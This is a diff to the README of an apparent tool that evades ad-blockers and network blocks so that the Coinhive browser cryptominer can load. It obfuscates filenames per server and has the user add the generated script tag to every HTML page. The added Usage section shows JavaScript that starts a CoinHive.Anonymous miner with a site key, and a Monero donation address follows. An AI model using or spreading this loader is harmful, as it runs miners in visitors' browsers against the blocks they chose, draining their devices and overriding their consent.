@@ -3,7 +3,6 @@ This script attempts to bypass extensions or network blocks that prevent the use
 
 ## Features
 * Obfuscates filenames per server
-* Just include the generated script tag and run ```loadCoinhive()``` before your mining code and your done!
 
 ## Installation
 ### Ubuntu/Unix
@@ -15,6 +14,15 @@ Then, add the script tag that the file generates to every HTML file you want to 
 ### Windows
 Not implemented yet
 
+## Usage
+```javascript
+loadCoinhive(function() {
+  //Code that mines
+  //For example:
+  var miner = new CoinHive.Anonymous('YOUR_SITE_KEY');
+	miner.start();
+});
+```
 ## Donate!
 If you appreciate this project, feel free to send me some Monero at:
 ```424kUkn7pU7SVF4qmbzVt6fLPRFw6Q1v7RmVq4qE9sE2V5dyhZoGdWHDUFui85SfhVTfmDN3CzcYDQSwo41z3AuLDzU3qQt```
